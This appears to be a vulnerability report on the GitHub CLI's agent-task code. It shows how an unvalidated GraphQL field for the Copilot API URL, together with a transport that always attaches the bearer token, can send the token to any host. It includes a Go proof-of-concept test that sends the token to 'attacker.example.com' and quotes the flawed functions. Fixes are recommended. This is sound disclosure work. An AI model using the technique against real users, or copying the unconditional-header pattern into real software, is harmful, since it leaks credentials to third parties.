### Title
Attacker-controlled `copilotEndpoints.api` GraphQL field causes token exfiltration to arbitrary host - ([File: pkg/cmd/agent-task/shared/capi.go])

### Summary
`resolveCapiURL` accepts the `viewer.copilotEndpoints.api` GraphQL field verbatim from the configured host with no allowlist or domain validation, and this value is fed directly into `capi.NewCAPIClient` as the Copilot API base URL. Because the underlying `capiTransport.RoundTrip` unconditionally attaches `Authorization: Bearer <token>` to every request made with the mutated `httpClient` (not just requests whose host matches the resolved CAPI host), any subsequent CAPI request (`ListLatestSessionsForViewer`, `GetSession`, `GetSessionLogs`, `ListSessionsByResourceID`) sends the user's active token to whatever host the attacker-controlled server chose.

### Finding Description
- `CapiClientFunc` obtains the active token via `authCfg.ActiveToken(host)` [1](#0-0)  and then calls `resolveCapiURL(cachedClient, host)` to fetch the CAPI base URL from the same `host`'s GraphQL API [2](#0-1) .
- `resolveCapiURL` queries `viewer.copilotEndpoints.api` and returns it as-is, with the only check being that it's non-empty — no scheme, host, or domain-suffix validation is performed: [3](#0-2) .
- `capi.NewCAPIClient` mutates the shared `httpClient`'s transport to `capiTransport`, binding the token to that client regardless of destination: [4](#0-3) .
- `capiTransport.RoundTrip` sets the `Authorization: Bearer <token>` header **unconditionally on every request**, and only checks `req.URL.Host == ct.capiHost` to decide whether to add the `Copilot-Integration-Id`/version headers — the Authorization header itself is not gated by host: [5](#0-4) .
- All CAPI request paths (`ListLatestSessionsForViewer`, `GetSession`, `GetSessionLogs`, `ListSessionsByResourceID`) build their URLs directly from `c.capiBaseURL` via `safeurl.JoinPathWithHostPrefix`, which only joins the path onto whatever host is in `capiBaseURL` — it does not validate that the host is a legitimate GitHub/Copilot endpoint: [6](#0-5) [7](#0-6) .

Because the attacker (a malicious/compromised GitHub Enterprise Server that the victim has pointed `gh` at, per the stated threat model) fully controls the `CopilotEndpoints` GraphQL response for that host, they can set `viewer.copilotEndpoints.api` to `https://attacker.example.com`. Every subsequent CAPI call then sends `Authorization: Bearer <active token>` to `attacker.example.com`, exfiltrating the credential.

### Impact Explanation
This breaks credential confinement: the active token, which should only ever be sent to the configured trusted host, is transmitted to an attacker-chosen endpoint whenever the victim runs any agent-task subcommand that uses `CapiClientFunc` (`agent-task list`, `view`, `create`). This matches GitHub's "credential/token disclosure to third party" bounty impact class — the token can then be replayed against the real GitHub API by the attacker.

### Likelihood Explanation
Requires the attacker to control the GraphQL response of the host the victim has configured `gh` to talk to (e.g., a malicious or compromised GitHub Enterprise Server instance, which is explicitly within the stated threat model as "a host the victim points gh at"). No MITM, no local access, and no social engineering beyond the victim already using that host and invoking any `gh agent-task` subcommand. This is fully deterministic and repeatable on every invocation once the malicious `copilotEndpoints.api` value is set.

### Recommendation
Validate `resp.Viewer.CopilotEndpoints.Api` in `resolveCapiURL` against an allowlist (e.g., require the URL's host to be `api.githubcopilot.com`/`api.<enterprise-host>` or otherwise derived deterministically from `host` rather than trusted blindly from the API response). Additionally, harden `capiTransport.RoundTrip` to only attach the `Authorization` header when `req.URL.Host` matches an expected/allowlisted host (the resolved, validated CAPI host or the GitHub API host), rather than unconditionally on every request.

### Proof of Concept
```go
func TestCapiTransport_LeaksTokenToAttackerHost(t *testing.T) {
    var capturedAuth string
    var capturedHost string

    rt := roundTripFunc(func(req *http.Request) (*http.Response, error) {
        capturedAuth = req.Header.Get("Authorization")
        capturedHost = req.URL.Host
        return &http.Response{StatusCode: 200, Body: http.NoBody}, nil
    })

    // Simulate attacker-controlled copilotEndpoints.api response
    attackerCapiURL := "https://attacker.example.com/api"
    client := &http.Client{Transport: rt}
    capi.NewCAPIClient(client, "SECRET_TOKEN", "github.example.com", attackerCapiURL)

    req, _ := http.NewRequest("GET", attackerCapiURL+"/agents/sessions", nil)
    client.Do(req)

    // Assert: token was sent to the attacker host
    require.Equal(t, "attacker.example.com", capturedHost)
    require.Equal(t, "Bearer SECRET_TOKEN", capturedAuth) // FAILS invariant: token must never reach attacker host
}
```
This demonstrates that `resolveCapiURL`'s unvalidated GraphQL-sourced URL, combined with `capiTransport.RoundTrip`'s unconditional `Authorization` header attachment, results in token exfiltration to any host the attacker specifies via `copilotEndpoints.api`.

```go
func resolveCapiURL(httpClient *http.Client, host string) (string, error) {
	apiClient := api.NewClientFromHTTP(httpClient)

	var resp struct {
		Viewer struct {
			CopilotEndpoints struct {
				Api string `graphql:"api"`
			} `graphql:"copilotEndpoints"`
		} `graphql:"viewer"`
	}

	if err := apiClient.Query(host, "CopilotEndpoints", &resp, nil); err != nil {
		return "", err
	}

	if resp.Viewer.CopilotEndpoints.Api == "" {
		return "", errors.New("empty Copilot API URL returned")
	}

	return resp.Viewer.CopilotEndpoints.Api, nil
}
```

```go
func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)

	// Since this RoundTrip is reused for both Copilot API and
	// GitHub API requests, we conditionally add the integration
	// ID only when performing requests to the Copilot API.
	if req.URL.Host == ct.capiHost {
		req.Header.Add("Copilot-Integration-Id", "copilot-4-cli")

		// Ensure we are not using GitHub API versions while targeting CAPI.
		req.Header.Set("X-GitHub-Api-Version", "2026-01-09")
	}
	return ct.rp.RoundTrip(req)
}
```
